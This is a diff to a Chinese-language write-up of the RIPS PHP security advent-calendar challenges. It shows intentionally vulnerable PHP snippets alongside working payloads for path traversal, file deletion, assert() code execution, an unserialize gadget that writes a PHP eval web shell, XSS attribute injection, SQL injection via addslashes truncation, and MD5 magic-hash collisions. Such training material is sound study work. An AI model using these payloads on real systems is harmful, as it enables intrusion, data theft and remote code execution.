@@ -180,7 +180,428 @@ class HomeController {
 }
 ```
 
+## 5 - Postcard
+
+```php
+class Mailer {
+    private function sanitize($email) {
+        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+            return '';
+        }
+
+        return escapeshellarg($email);
+    }
+
+    public function send($data) {
+        if (!isset($data['to'])) {
+            $data['to'] = 'none@ripstech.com';
+        } else {
+            $data['to'] = $this->sanitize($data['to']);
+        }
+
+        if (!isset($data['from'])) {
+            $data['from'] = 'none@ripstech.com';
+        } else {
+            $data['from'] = $this->sanitize($data['from']);
+        }
+
+        if (!isset($data['subject'])) {
+            $data['subject'] = 'No Subject';
+        }
+
+        if (!isset($data['message'])) {
+            $data['message'] = '';
+        }
+
+        mail($data['to'], $data['subject'], $data['message'],
+             '', "-f" . $data['from']);
+    }
+}
+
+$mailer = new Mailer();
+$mailer->send($_POST);
+```
+
+
+
+
+## 6 - Frost Pattern
+
+> preg_replace 配置
+
+```php
+class TokenStorage {
+    public function performAction($action, $data) {
+        switch ($action) {
+            case 'create':
+                $this->createToken($data);
+                break;
+            case 'delete':
+                $this->clearToken($data);
+                break;
+            default:
+                throw new Exception('Unknown action');
+        }
+    }
+
+    public function createToken($seed) {
+        $token = md5($seed);
+        file_put_contents('/tmp/tokens/' . $token, '...data');
+    }
+
+    public function clearToken($token) {
+        $file = preg_replace("/[^a-z.-_]/", "", $token);
+        unlink('/tmp/tokens/' . $file);
+    }
+}
+
+$storage = new TokenStorage();
+$storage->performAction($_GET['action'], $_GET['data']);
+```
+
+本题实现的功能就两个，写文件，删除文件。
+
+`createToken()` 唯一可控的就是 `seed` ，然而文件名还被完全限死，内容也不可控。
+
+`clearToken()` 有一个正则匹配的过滤，不过`/[^a-z.-_]/` 这里配置有点问题
+
+![](http://ww1.sinaimg.cn/large/de75fd55gy1g1f65tmt8vj20jd02l0sz.jpg)
+
+### payload
+
+任意文件删除漏洞
+
+```
+action=delete&data=../../config.php
+```
+
+
+
+## 7 - Bells
+
+> parse_str
+
+```php
+function getUser($id) {
+    global $config, $db;
+    if (!is_resource($db)) {
+        $db = new MySQLi(
+            $config['dbhost'],
+            $config['dbuser'],
+            $config['dbpass'],
+            $config['dbname']
+        );
+    }
+    $sql = "SELECT username FROM users WHERE id = ?";
+    $stmt = $db->prepare($sql);
+    $stmt->bind_param('i', $id);
+    $stmt->bind_result($name);
+    $stmt->execute();
+    $stmt->fetch();
+    return $name;
+}
+
+$var = parse_url($_SERVER['HTTP_REFERER']);
+parse_str($var['query']);
+$currentUser = getUser($id);
+echo '<h1>'.htmlspecialchars($currentUser).'</h1>';
+```
+
+`$_SERVER['HTTP_REFERER']` 是可控的，改下 `Referer` 头即可
+
+`parse_str()` 极其容易导致变量覆盖漏洞。
+
+> 要获取当前的 *QUERY_STRING*，可以使用 [$_SERVER['QUERY_STRING'\]](https://php.net/manual/zh/reserved.variables.server.php) 变量。 
+
+
+
+## 8 - Candle
+
+> preg_replace /e
+
+```php
+header("Content-Type: text/plain");
+
+function complexStrtolower($regex, $value) {
+    return preg_replace(
+        '/(' . $regex . ')/ei',
+        'strtolower("\\1")',
+        $value
+    );
+}
+
+foreach ($_GET as $regex => $value) {
+    echo complexStrtolower($regex, $value) . "\n";
+}
+```
+
+`preg_replace()` 的 `e` 模式可以 RCE
+
+
+
+## 9 - Rabbit
+
+> str_replace
+
+```php
+class LanguageManager {
+    public function loadLanguage() {
+        $lang = $this->getBrowserLanguage();
+        $sanitizedLang = $this->sanitizeLanguage($lang);
+        require_once("/lang/$sanitizedLang");
+    }
+
+    private function getBrowserLanguage() {
+        $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
+        return $lang;
+    }
+
+    private function sanitizeLanguage($language) {
+        return str_replace('../', '', $language);
+    }
+}
+
+(new LanguageManager())->loadLanguage();
+```
+
+`$_SERVER['HTTP_ACCEPT_LANGUAGE']` 是可控的，可以尝试文件包含。
+
+![](http://ww1.sinaimg.cn/large/de75fd55gy1g1f3gicodej20t207dab2.jpg)
+
+这里的过滤太弱了，只是简单的替换一下，可以将 `\/` 都删掉。
+
+> 如果没有一些特殊的替换需求（比如正则表达式），你应该使用该函数替换 [ereg_replace()](https://php.net/manual/zh/function.ereg-replace.php) 和 [preg_replace()](https://php.net/manual/zh/function.preg-replace.php)
+
+```php
+print_r(str_replace("../","","....//"));
+// ../
+```
+
+### payload
+
+```
+Accept-Language: .//....//....//etc/passwd
+```
+
+
+
+## 10 - Anticipation
+
+> 未正确 exit
+
+```php
+extract($_POST);
+
+function goAway() {
+    error_log("Hacking attempt.");
+    header('Location: /error/');
+}
+
+if (!isset($pi) || !is_numeric($pi)) {
+    goAway();
+}
+
+if (!assert("(int)$pi == 3")) {
+    echo "This is not pi.";
+} else {
+    echo "This might be pi.";
+}
+```
+
+该代码的大致意思是输入一个 `pi`，验证是否为数字类型，非数字将重定向到错误页面。
+
+`assert()` RCE 可以参考这篇文章 [assert引起的代码注射](https://www.cnblogs.com/sn00py/p/5925944.html)，另外`extract()` 很容易引起变量覆盖
+
+### payload
+
+```
+POST
+pi=phpinfo()
+```
+
+PS:这里的 `phpinfo` 不太好看到，写个 `webshell` 进去再看。
+
+
+
+## 11 - Pumpkin Pie
+
+> unserialize
+
+```php
+class Template {
+    public $cacheFile = '/tmp/cachefile';
+    public $template = '<div>Welcome back %s</div>';
+
+    public function __construct($data = null) {
+        $data = $this->loadData($data);
+        $this->render($data);
+    }
+
+    public function loadData($data) {
+        if (substr($data, 0, 2) !== 'O:'
+            && !preg_match('/O:\d:\/', $data)) {
+            return unserialize($data);
+        }
+        return [];
+    }
+
+    public function createCache($file = null, $tpl = null) {
+        $file = $file ?? $this->cacheFile;
+        $tpl = $tpl ?? $this->template;
+        file_put_contents($file, $tpl);
+    }
+
+    public function render($data) {
+        echo sprintf(
+            $this->template,
+            htmlspecialchars($data['name'])
+        );
+    }
+
+    public function __destruct() {
+        $this->createCache();
+    }
+}
+
+new Template($_COOKIE['data']);
+```
+
+`createCache()` 里面有个 `file_put_contents()` 可以拿来写 `shell` ，再结合一下 `__destruct()` 构造反序列化漏洞来利用。
+
+`loadData()` 本意可能是想反序列化一个数组，有简单的过滤，但是`preg_match()` 这里的 `\` 写的有问题，造成正则匹配过滤失效。
+
+**魔术方法**
+
+```php
+__wakeup() 		//使用unserialize时触发
+__sleep() 		//使用serialize时触发
+__destruct() 	//对象被销毁时触发
+__call() 		//在对象上下文中调用不可访问的方法时触发
+__callStatic() 	//在静态上下文中调用不可访问的方法时触发
+__get() 		//用于从不可访问的属性读取数据
+__set() 		//用于将数据写入不可访问的属性
+__isset() 		//在不可访问的属性上调用isset()或empty()触发
+__unset() 		//在不可访问的属性上使用unset()时触发
+__toString() 	//把类当作字符串使用时触发
+__invoke() 		//当脚本尝试将对象调用为函数时触发
+```
+
+### payload
+
++ 将对象放到数组里
+
+```php
+<?php
+class Template {
+    public $cacheFile = 'shell.php';
+    public $template = '<?php eval($_GET[1]); ?>';
+}
+
+$arr = array(new Template);
+echo urlencode(serialize($arr));
+
+// a:1:{i:0;O:8:"Template":2:{s:9:"cacheFile";s:9:"shell.php";s:8:"template";s:24:"<?php eval($_GET[1]); ?>";}}
+// 即可成功写入 shell.php
+```
+
++ 如果正则配置正确，`O:+8` 绕过 [php反序列unserialize的一个小特性](https://www.phpbug.cn/archives/32.html)
+
+```php
+a:1:{i:0;O:8:"Template":2:{s:9:"cacheFile";s:9:"shell.php";s:8:"template";s:24:"<?php eval($_GET[1]); ?>";}}
+```
+
+
+
+## 12 - String Lights
+
+> htmlentities
+
+```php
+$sanitized = [];
+
+foreach ($_GET as $key => $value) {
+    $sanitized[$key] = intval($value);
+}
+
+$queryParts = array_map(
+    function ($key, $value) {
+    	return $key . '=' . $value;
+	}, array_keys($sanitized), array_values($sanitized));
+
+$query = implode('&', $queryParts);
+
+echo "<a href='/images/size.php?" .
+    htmlentities($query) . "'>link</a>";
+```
+
+先看一下这两个函数
+
+```php
+implode ( string $glue , array $pieces ) : string
+// 用 glue 将一维数组中的值拼接起来
+    
+htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get("default_charset") [, bool $double_encode = true ]]] ) : string
+// 将字符转换为 HTML 转义字符，也就是对一些特殊字符进行 HTML 实体编码
+// 本函数各方面都和 htmlspecialchars() 一样， 除了 htmlentities() 会转换所有具有 HTML 实体字符
+```
+
+上面的代码用的是 `htmlentities()` 的默认参数
+
+> **ENT_COMPAT**  | 会转换双引号，不转换单引号 
+>
+> **ENT_HTML401** | 以 HTML 4.01 处理代码
+
+也就是说，不会对单引号进行实体编码
+
+### payload
+
+可以构造一个事件去触发 xss
+
+```html
+<a href='' onmouseover=alert(1)>xss</a>
+<a href='' onclick=alert(1)>xss</a>
+```
+
+如果直接提交
+
+```
+'onmouseover=alert(1)
+'onclick=alert(1)
+```
+
+显然是不行的，`alert(1)` 将被 `intval` 掉，这时候可以将等号编码为 `%3D` 然后再加个等号
+
+```php
+'onmouseover%3Dalert(1)//=1
+'onclick%3Dalert(1)//=1
+
+// $_GET
+Array (
+	['onmouseover=alert(1)//] => 1
+    ['onclick=alert(1)//] => 1
+)
+```
+
+最终形成的 `payload`
+
+```html
+<a href='/images/size.php?'onmouseover=alert(1)//=1'>link</a>
+<a href='/images/size.php?'onclick=alert(1)//=1'>link</a> 
+```
+
+如果可控点在 `href`
+
+```html
+<a href=javascript:alert(1)>
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<a href=data:text/html;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e>
+```
+
+
+
 ## 13 - Turkey Baster
+
+> 截断惹的祸
 
 ```php
 class LoginManager {
@@ -221,7 +642,23 @@ if (!$auth->isValid()) {
 }
 ```
 
-注意到两个参数都被 `addslashes()` 转义，而且将截断。
+注意到两个参数都被 `addslashes()` 转义，而且将被截断。
+
+如果没有这个截断操作，有 `addslashes()` 加持还是会安全很多，有了截断就可以搞事情了，“逃逸”一个 `\` 出来将 `‘` 吃掉。
+
+### payload
+
+```php
+user=1234567890123456789\&passwd=or 1#
+```
+
+形成的 `sql` 语句
+
+```sql
+where user = '1234567890123456789\' AND password = 'or 1#'
+```
+
+
 
 
 ## 14 - Snowman
@@ -526,7 +963,7 @@ close           ls              prompt          runique
 
 最终类似的 payload 为：`1%0a%0dDELETE%20test`，其中的 `DELETE` 可替换为其他指令。
 
-
+# TODO: 加 file 协议或许能上传文件
 
 ## 17 - Mistletoe
 
@@ -698,7 +1135,7 @@ class ImageViewer {
 echo (new ImageViewer("image.png"));
 ```
 
-是一个生成缩略图的类，`system()` 或许可以命令注入，`__toString()` 可能有 `xss`。
+一个生成缩略图的类，`system()` 或许可以命令注入，`__toString()` 可能有 `xss`。
 
 可惜 `file` 不可控，那我们仔细看看 `size` ，这有个特别的函数
 
@@ -721,7 +1158,7 @@ var_dump(stripcslashes('\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\
 
 尝试写一个 `webshell` ，也可以直接反弹一个 `shell`。
 
-`stripcslashes()` 这函数难道不是多次一举，限制只能传入数字不就好了？为了兼容不同进制吗？
+`stripcslashes()` 这难道不是多次一举，限制只能传入数字不就好了？为了兼容不同进制吗？
 
 ### payload
 
@@ -822,5 +1259,117 @@ class ParamExtractor {
 
 $cmd = (new ParamExtractor())->getCommand($_GET['p']);
 system('resizeImg image.png ' . $cmd);
+```
+
+## 22 - Chimney
+
+> 魔法哈希
+
+```php
+if (isset($_POST['password'])) {
+    setcookie('hash', md5($_POST['password']));
+    header("Refresh: 0");
+    exit;
+}
+
+$password = '0e836584205638841937695747769655';
+if (!isset($_COOKIE['hash'])) {
+    echo '<form><input type="password" name="password" />'
+        . '<input type="submit" value="Login" ></form >';
+    exit;
+} elseif (md5($_COOKIE['hash']) == $password) {
+    echo 'Login succeeded';
+} else {
+    echo 'Login failed';
+}
+```
+
+注意这有一个 `==`，比较时会自动进行类型转换，而给的 `password` 是 `0e` 开头
+
+```php
+var_dump('0e836584205638841937695747769655'=='0e');
+// bool(true)
+```
+
+### payload
+
+```
+QNKCDZO
+0e830400451993494058024219903391
+
+s155964671a
+0e342768416822451524974117254469
+
+s214587387a
+0e848240448830537924465865611904
+
+s878926199a
+0e545993274517709034328855841020
+
+s1091221200a
+0e940624217856561557816327384675
+
+s1885207154a
+0e509367213418206700842008763514
+
+s1836677006a
+0e481036490867661113260034900752
+
+s1184209335a
+0e072485820392773389523109082030
+
+s1665632922a
+0e731198061491163073197128363787
+
+s1502113478a
+0e861580163291561247404381396064
+
+s532378020a
+0e220463095855511507588041205815
+```
+
+
+
+## 23 - Cookies
+
+```php
+class LDAPAuthenticator {
+    public $conn;
+    public $host;
+
+    function __construct($host = "localhost") {
+        $this->host = $host;
+    }
+
+    function authenticate($user, $pass) {
+        $result = [];
+        $this->conn = ldap_connect($this->host);
+        ldap_set_option(
+            $this->conn,
+            LDAP_OPT_PROTOCOL_VERSION,
+            3
+        );
+        if (!@ldap_bind($this->conn))
+            return -1;
+        $user = ldap_escape($user, null, LDAP_ESCAPE_DN);
+        $pass = ldap_escape($pass, null, LDAP_ESCAPE_DN);
+        $result = ldap_search(
+            $this->conn,
+            "",
+            "(&(uid=$user)(userPassword=$pass))"
+        );
+        $result = ldap_get_entries($this->conn, $result);
+        return ($result["count"] > 0 ? 1 : 0);
+    }
+}
+
+if(isset($_GET["u"]) && isset($_GET["p"])) {
+    $ldap = new LDAPAuthenticator();
+    if ($ldap->authenticate($_GET["u"], $_GET["p"])) {
+        echo "You are now logged in!";
+    } else {
+        echo "Username or password unknown!";
+    }
+}
 ```
 
